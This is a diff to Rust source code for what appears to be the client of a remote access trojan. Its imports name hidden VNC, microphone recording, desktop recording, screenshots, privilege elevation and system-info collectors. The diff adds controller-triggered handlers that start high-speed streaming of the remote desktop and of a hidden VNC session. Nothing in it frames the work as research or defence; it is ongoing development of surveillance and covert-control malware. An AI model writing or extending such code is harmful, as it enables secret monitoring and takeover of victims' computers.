@@ -1,6 +1,7 @@
 use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands, handle_input_command};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
+use crate::features::video_stream::start_high_speed_stream;
 use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use crate::features::mic::{send_mic_device_list, start_mic_live, stop_mic_live, start_mic_recording, stop_mic_recording};
 use crate::features::desktop_recording::{start_desktop_recording, stop_desktop_recording};
@@ -115,6 +116,14 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => start_remote_desktop(config),
 
+            Ok(Some(ClientboundPacket::StartHighSpeedRemoteDesktop { ticket, room, config: _ })) => {
+                tokio::spawn(async move {
+                    if let Err(e) = start_high_speed_stream(ticket, room).await {
+                        eprintln!("❌ High-speed RDP failed: {:?}", e);
+                    }
+                });
+            }
+
             Ok(Some(ClientboundPacket::StopRemoteDesktop)) => stop_remote_desktop(),
 
             Ok(Some(ClientboundPacket::StartRemoteDesktopAudio)) => start_remote_desktop_audio(),
@@ -122,6 +131,14 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StopRemoteDesktopAudio)) => stop_remote_desktop_audio(),
 
             Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
+
+            Ok(Some(ClientboundPacket::StartHighSpeedHVNC { ticket, room })) => {
+                tokio::spawn(async move {
+                    if let Err(e) = start_high_speed_stream(ticket, room).await {
+                        eprintln!("❌ High-speed HVNC failed: {:?}", e);
+                    }
+                });
+            }
 
             Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
 
